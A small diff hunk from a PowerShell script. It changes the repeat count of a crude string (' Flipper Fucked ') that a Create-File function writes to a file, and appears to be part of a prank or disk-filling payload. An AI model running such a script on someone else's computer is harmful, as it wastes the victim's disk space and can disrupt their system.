@@ -67,7 +67,7 @@ Function Create-File {
     $file = New-Item -Path $fullPath -ItemType "file" -Force
     
     # Define the string to output
-    $stringToOutput += " Flipper Fucked "*214748364
+    $stringToOutput += " Flipper Fucked "*21474836
     
     # Output the string to the custom named file
     $stringToOutput | Out-File -FilePath $file.FullName
